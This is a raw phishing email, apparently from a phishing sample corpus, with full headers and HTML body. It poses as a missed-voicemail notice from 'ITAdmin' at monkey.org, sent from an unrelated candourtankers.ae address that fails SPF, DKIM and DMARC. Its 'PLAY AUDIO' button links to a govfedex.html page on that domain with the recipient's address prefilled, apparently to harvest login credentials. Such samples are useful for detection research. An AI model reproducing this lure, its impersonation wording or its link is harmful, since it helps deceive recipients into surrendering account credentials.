@@ -1,0 +1,167 @@
+Return-Path: info@candourtankers.ae
+Delivered-To: jose@monkey.org
+X-FDA: 82844348748.27.640509A
+Received: from stradwhm.stradsolutions.com (stradwhm.stradsolutions.com
+ [103.87.173.15])	by imf02.b.hostedemail.com (Postfix) with ESMTP id
+ 8ED901A0005	for <jose@monkey.org>; Sat, 30 Nov 2024 23:26:52 +0000 (UTC)
+Authentication-Results: imf02.b.hostedemail.com;	dkim=none;	dmarc=none;
+	spf=none (imf02.b.hostedemail.com: domain of info@candourtankers.ae has no
+ SPF policy when checking 103.87.173.15) smtp.mailfrom=info@candourtankers.ae
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1733009210; a=rsa-sha256;
+	cv=none;
+	b=6TMm9KshumVdqGoQPcfkyWN3gorpYZTTlLUbWpXYcoJnSeuwyY4RvptPWBEBzKxQ+LhN8l
+	ICyJParUIEDwfNVHSTEI/zEcs46qUmosr76IdpXYbqCUNLBFBBuDZ/mpRJkFLwU84yywed
+	BfOwSz94Krp642QH+xuyYPO9z/o/vLA=
+ARC-Authentication-Results: i=1;	imf02.b.hostedemail.com;	dkim=none;
+	dmarc=none;	spf=none (imf02.b.hostedemail.com: domain of
+ info@candourtankers.ae has no SPF policy when checking 103.87.173.15)
+ smtp.mailfrom=info@candourtankers.ae
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1733009210;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=BT0YHOP1dZg2xG1yLrhdpchhK9ujM3gRzBHUhMeaa8s=;
+	b=RDFKmJq3JOZE8LZ5pgD/KXHR8UiSm8bH6NCitddmZWD2O1PfdEW4/PvZ0i1q5HGVx2U7+G
+	StLyUHAZWD2yoN437GE/Yg+pZ4WKsZ72uRlQ2HF5dJoTf5tVAYlOA3ChHVysqCfzm5AOAz
+	YhNd67EqWm1MPXKCBiX9xPT15McLyL4=
+Received: from [70.35.205.119] (port=57361)	by stradwhm.stradsolutions.com
+ with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384	(Exim
+ 4.96.2)	(envelope-from <info@candourtankers.ae>)	id 1tHWrV-007TnC-13	for
+ jose@monkey.org;	Sun, 01 Dec 2024 04:56:53 +0530
+From: "Voicemail, monkey.org"<info@candourtankers.ae>
+To: jose@monkey.org
+Subject: Re: jose You have a new Voicemail Message From ITAdmin monkey.org
+Date: 30 Nov 2024 23:26:52 +0000
+Message-ID: <20241130232651.2FCB764F344B9281@candourtankers.ae>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - stradwhm.stradsolutions.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - candourtankers.ae
+X-Get-Message-Sender-Via:
+ stradwhm.stradsolutions.com: authenticated_id: info@candourtankers.ae
+X-Authenticated-Sender: stradwhm.stradsolutions.com: info@candourtankers.ae
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Spam-Status: No, score=4.28
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: 8ED901A0005
+X-Stat-Signature: g5kibediuz1891osoaehfe7mssh6kxob
+X-Rspam-User: 
+X-HE-Tag: 1733009212-819460
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19WpnUfQfwbK3O0XhNz2iXH1HzhoatLSY0Pcc6sVq8r3Qi?=
+ =?utf-8?q?evvRgjqdB4+93awi2yRdXHJMhMuxxm0DTi3Pe+cK2bI59/W/QoFUxRGP9g1nuYNZE?=
+ =?utf-8?q?Tr0MytJXgD6T72Tr2wgn/7d21fNZ9vghoONAZVYD2PVap7h3Eb4Hks/gW5jh27f+P?=
+ =?utf-8?q?/s+qKS+fKKAcauFqKo94qSV1OPMCVYEt5yIaqyxqx20zx3YiyOqGvs6HsiifcL3Ug?=
+ =?utf-8?q?q5oN/J1det+b3uPwb1G1oiwNJwF3vadBwMpyLu9RmyVkQEm4B6i0HwZ2y1lCBRtNH?=
+ =?utf-8?q?QmqWHo2h0G0KwieCd5Xas1LehYlb7O+aiEDxSUUMpZYqPZi4LtEHi5Ul5ssdXCrST?=
+ =?utf-8?q?vW8UMTS3qSpOySQiFX/2G6O903hm/ncnUE5QtTiNToT+YSouy7p7nax0CghNCLdYk?=
+ =?utf-8?q?yuPmc83NrKUS/TjxMSlSYikDOJeHyIg4IoWo9mrezppA4KRm2ZxAr4SR4lFYp7dRf?=
+ =?utf-8?q?Ey05yRfL1djUadQk42xF3sHom7Zc6JyG+ME+CqXQP/8eHQKyN67v4cV6StaHIGCRk?=
+ =?utf-8?q?OfNq5ifl+jw+X3a4ZmYNFb1Ura1gWrCbs88T2Y1bCwSEEkyoHYXVe1gYfya16qB6m?=
+ =?utf-8?q?36JKZR7G3bjMQmnHrgh6TWQaSEQyUf8yC4746wLqSf3q2dlb6b56XNL/JFpnNrkC6?=
+ =?utf-8?q?IVQ9UVuCqv/DYs6XbnHTE3tHKhJy3MxdDBUd7Qb+HoRtS/NqPZDmA/6vXR0fy0ojp?=
+ =?utf-8?q?RzOyj2kh6wsYeXFLBjKMc61Y47US8Nk+/X6RagB1UyGHohLq+4yDTudsOJOqNI808?=
+ =?utf-8?q?ayHQiIKwodWZA4UvWAUOxQ6GDv7in9tpGf7s7vsyB8zh3Fkozggf3gnSRH1/DIBIF?=
+ =?utf-8?q?YXRkE4W1sOQbPD8L4pwIdoCY8yvdvuGf5V0brOgh8EvBF4hnUx609CJ+Mj/W6ABLL?=
+ =?utf-8?q?vUu2ah/IOXIcPN4mf0WRiJ_Ps87r5XyuRkBy183QL6erjOUbBu0Eiff73rd1VS+QQ?=
+ =?utf-8?q?ydKOVqVSH/OzcCJPoqG6Sbtv7I4aEseH9C58nG374f0Qa0nAG8sq4bF45Zs1L1oge?=
+ =?utf-8?q?4hwhtioDvEm5uRrbJwv2aa4ar2FU/Da/YTnVSJpzh3Sn/fw6gbfOsYpYPAWayrV5d?=
+ =?utf-8?q?jc86b5kk5+KvyI3hpULbuSQ/bRPuQRAq1aGIG/NCOjaIYOBmYebc+jW8VfNXANfcC?=
+ =?utf-8?q?7Lo3vdkqSPwpW4XAapW+3tWtz9l2YxhCJ1QcmdNpKeix1jnSrroUSWcFRnemeWW7w?=
+ =?utf-8?q?wor9YYz+Syqarg02RCLw6ZtwlzBEjc6Yc+xY/2ynKvgqf5mMLUoGl3PipZGlclvaF?=
+ =?utf-8?q?zc0i0/9XHw8x089z0joLsVgyTRkldYkUVk5oDM02bRHeeCLTKUSPM5c/eJRX0VruU?=
+ =?utf-8?q?GGuzI2jZ4bj5SHuJ9JoY/7fn8IfHoQFTOaGdNT/R9xJ6LHpZMpDZRvmWgy/T5zPR1?=
+ =?utf-8?q?Q7Rprlg66I5vMAApkr0+zHR+aohnJoiAVuPg3YuwglSRdWm13xClYzYVuSsa3Gol4?=
+ =?utf-8?q?mYxkzwEG2MKPjjsUGHsN9Al//4q4g6Zr8AOpq6ScGGB7Pk4YdnfyaWt9qzJnj3iSF?=
+ =?utf-8?q?pkcWmJUjLt1e4Pcrgs8LEtdkuf6mQikj4Gd/Kq/PTZJ3ecW/DGxz+L8ZPfSe4=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 370
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><br>
+<table width=3D"600" class=3D"x_x_x_content-table" style=3D"padding: 25px 3=
+2px; border-bottom-color: rgb(238, 238, 238); border-bottom-width: 1px; bor=
+der-bottom-style: solid;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">=
+
+<tbody>
+<tr>
+<td class=3D"x_x_x_email-content" style=3D"line-height: 20px; font-size: 14=
+px; white-space: normal !important;">Hello <b>jose@monkey.org</b>,<br></td>=
+</tr>
+<tr>
+<td style=3D"line-height: 24px; padding-bottom: 20px; font-size: 16px; whit=
+e-space: normal !important;">You missed a call from&nbsp;ITAdmin @ <span st=
+yle=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-image: n=
+one; vertical-align: baseline;">&nbsp;monkey.org<em> </em></span>
+<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; vertical-align: baseline; white-space: nowrap;">
+(+971) <span style=3D"color: rgb(0, 0, 0); text-transform: none; text-inden=
+t: 0px; letter-spacing: normal; font-family: aptos, sans-serif; font-size: =
+medium; font-style: normal; font-weight: 400; word-spacing: 0px; float: non=
+e; display: inline !important; white-space: normal; orphans: 2; widows: 2; =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;">
+432xxx55</span></span></td></tr>
+<tr>
+<td style=3D"color: rgb(117, 117, 117) !important; white-space: normal !imp=
+ortant;">Click PLAY below to listen to your message<br></td></tr>
+<tr>
+<td style=3D"padding: 20px 0px; line-height: 37px; font-size: 14px; white-s=
+pace: normal !important;">
+<a style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-ima=
+ge: none; vertical-align: baseline;" href=3D"https://candourtankers.ae/govf=
+edex.html?email=3Djose@monkey.org" target=3D"_blank" rel=3D"noopener norefe=
+rrer">
+<span style=3D"margin: 0px; padding: 10px 15px; border: 0px currentColor; b=
+order-image: none; color: rgb(255, 255, 255) !important; text-transform: up=
+percase; letter-spacing: 0.05em; text-decoration: none; vertical-align: bas=
+eline; background-color: rgb(0, 121, 107);">PLAY AUDIO</span></a></td></tr>=
+</tbody></table>
+<table width=3D"600" class=3D"x_x_x_content-table" style=3D"padding: 25px 3=
+2px; color: rgb(117, 117, 117) !important; font-family: inherit; font-size:=
+ 9px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"white-space: normal !important;">
+<table width=3D"240" class=3D"x_x_x_footer-link" style=3D"line-height: 14px=
+; font-family: inherit; font-size: 9px;" border=3D"0" cellspacing=3D"0" cel=
+lpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"padding-right: 5px; white-space: normal !important;"><span sty=
+le=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-image: no=
+ne; vertical-align: baseline;">monkey.org Voice Mail App</span></td>
+<td style=3D"padding-right: 5px; white-space: normal !important;"><span sty=
+le=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-image: no=
+ne; vertical-align: baseline;">HELP CENTER</span></td>
+<td style=3D"white-space: normal !important;"><span style=3D"margin: 0px; p=
+adding: 0px; border: 0px currentColor; border-image: none; vertical-align: =
+baseline;">HELP FORUM</span></td></tr></tbody></table></td></tr>
+<tr>
+<td style=3D"padding: 15px 0px; white-space: normal !important;">
+This email was sent to you because you indicated that you&amp;apos;d like t=
+o receive email notifications for missed calls. If you don&amp;apos;t want =
+to receive such emails in the future, please update your<span style=3D"marg=
+in: 0px; padding: 0px; border: 0px currentColor; border-image: none; vertic=
+al-align: baseline;">&nbsp;</span>
+<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
+image: none; vertical-align: baseline;">email notification settings</span>.=
+</td></tr>
+<tr>
+<td style=3D"white-space: normal !important;">monkey.org<br></td></tr>
+<tr></tr></tbody></table></body></html>
+
